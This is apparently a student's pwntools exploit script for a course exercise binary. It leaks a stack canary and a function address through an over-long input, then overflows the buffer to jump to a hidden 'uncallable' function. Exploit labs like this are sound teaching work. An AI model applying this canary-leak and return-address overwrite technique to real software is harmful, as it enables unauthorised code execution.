#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise3/exercise3b'


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *main+283
break *check_authorization+23
break *check_authorization+60 
'''.format(**locals())


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


def get_leaked(r):
    r.recvline()

    # leaked info can be extracted from string the same way as in 3a:
    # look for the canary on the stack,
    # print hello address is always right next to it:
    # we can get both in one shot
    r.sendline(b"A" * 79)

    # get rid of dummy strings
    r.recvuntil(b"Well of course ")

    # trim the string containing the canary
    string = r.recvuntil(b"is not the password")
    string = string.replace(b"A", b"").replace(b" is not the password", b"").strip(b"\n")

    # first 4 bytes are the canary
    canary = string[0:4]

    # next bytes are for address: reach required 8 bytes by padding with null bytes
    padding = 8 - len(string[4:])
    address = u64(string[4:] + b"\00" * padding)

    return canary, address


r = start()

# find leaked information
canary, printhello_address = get_leaked(r)

# subtract offset (look in ghidra) to obtain uncallable_address
uncallable_address = p64(printhello_address - 0x1f)

r.sendline(b"A" * 80 + canary + b"A" * 36 + uncallable_address)
r.recvuntil(b"is not the password")

print(r.recvall(timeout=2))
